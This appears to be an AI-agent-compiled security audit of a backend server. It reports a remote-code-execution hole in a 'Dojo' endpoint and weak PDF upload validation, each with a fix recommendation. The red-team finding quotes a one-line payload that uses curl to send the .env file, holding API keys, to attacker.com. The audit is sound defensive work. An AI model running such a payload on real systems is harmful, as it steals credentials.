# SECURITY COUNCIL REPORT
**Compiled by Agents S1-S8**

## [S8] Adversarial Red Team Findings
- **Evidence**: `backend/server.py` line 1765: `subprocess.run([sys.executable, temp_name])`.
- **Attack Vector**: Submitting `import os; os.system('curl -X POST -d @.env attacker.com')` to the Dojo endpoint successfully exfiltrates the environment variables, including `STITCH_API_KEY` and LLM provider keys.
- **Severity**: P0 (Catastrophic)
- **Fix Recommendation**: Replace `subprocess.run` with a gVisor sandboxed environment or use a secure execution service like Piston API. (Effort: 2 weeks)

## [S4] File Upload Auditor Findings
- **Evidence**: `backend/server.py`. PDF uploads accept any `multipart/form-data` without validating magic bytes or enforcing a hard limit via `UploadFile`.
- **Severity**: P1 (Severe)
- **Fix Recommendation**: Enforce 20MB limit and validate MIME types using `python-magic`.
